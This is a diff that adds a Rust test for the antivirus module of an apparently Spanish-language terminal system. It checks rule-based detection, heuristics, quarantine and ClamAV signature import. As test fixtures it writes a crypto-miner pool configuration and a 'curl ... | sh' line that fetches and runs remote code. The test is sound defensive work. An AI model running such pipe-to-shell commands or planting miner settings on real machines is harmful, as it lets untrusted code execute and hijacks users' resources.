@@ -1213,3 +1213,78 @@ fn firewall_pregunta_listas_y_conexiones() {
         "{out}"
     );
 }
+
+/// ADR 0024: reglas tipo YARA (las de severidad alta mandan a cuarentena; las de media
+/// avisan), heurística y firmas de ClamAV.
+#[test]
+fn antivirus_con_reglas_heuristica_y_clamav() {
+    let mut t = Driver::new();
+    open_terminal(&mut t);
+    let out = run(&mut t, "antivirus reglas");
+    assert!(
+        out.contains("Minero_de_criptomonedas") && out.contains("alta"),
+        "{out}"
+    );
+    assert!(run(&mut t, "antivirus").contains("Reglas: 7"));
+    let fs = t.d.fs_mut().unwrap();
+    let ts = jarvis_fs::Timestamp::EPOCH;
+    fs.write_file(
+        "/Documentos/minero.txt",
+        b"pool: stratum+tcp://pool.example:3333 --donate-level 1",
+        ts,
+    )
+    .unwrap();
+    fs.write_file(
+        "/Documentos/instalar.sh",
+        b"curl -fsSL http://example.com/x.sh | sh\n",
+        ts,
+    )
+    .unwrap();
+    fs.write_file(
+        "/Documentos/firmado.txt",
+        b"un archivo marcado por ClamAV",
+        ts,
+    )
+    .unwrap();
+    let out = run(&mut t, "antivirus analizar /Documentos/minero.txt");
+    assert!(
+        out.contains("AMENAZA") && out.contains("Minero_de_criptomonedas"),
+        "{out}"
+    );
+    // ClamAV: el SHA-256 de firmado.txt.
+    let h = run(&mut t, "antivirus analizar /Documentos/firmado.txt");
+    let sha = h.split("SHA-256 ").nth(1).unwrap()[..64].to_string();
+    t.d.fs_mut()
+        .unwrap()
+        .write_file(
+            "/Documentos/firmas.hsb",
+            format!("{sha}:29:Prueba.Firmado-1\n").as_bytes(),
+            ts,
+        )
+        .unwrap();
+    assert!(run(&mut t, "antivirus importar /Documentos/firmas.hsb").contains("1 firmas nuevas"));
+    let out = run(&mut t, "antivirus escanear /Documentos");
+    assert!(
+        out.contains("minero.txt") && out.contains("regla Minero_de_criptomonedas"),
+        "{out}"
+    );
+    assert!(
+        out.contains("firmado.txt") && out.contains("malware conocido"),
+        "{out}"
+    );
+    // El script solo es sospechoso: se avisa y queda donde estaba.
+    assert!(out.contains("instalar.sh: sospechoso"), "{out}");
+    assert!(fatfs_exists_in(&mut t, "/Documentos/instalar.sh"));
+    assert!(!fatfs_exists_in(&mut t, "/Documentos/minero.txt"));
+    assert!(run(&mut t, "antivirus cuarentena").contains("minero.txt"));
+    // MD5 de ClamAV (.hdb): no se importa.
+    t.d.fs_mut()
+        .unwrap()
+        .write_file(
+            "/Documentos/viejas.hdb",
+            b"44d88612fea8a8f36de82e1278abb02f:68:X\n",
+            ts,
+        )
+        .unwrap();
+    assert!(run(&mut t, "antivirus importar /Documentos/viejas.hdb").contains("SHA-256"));
+}
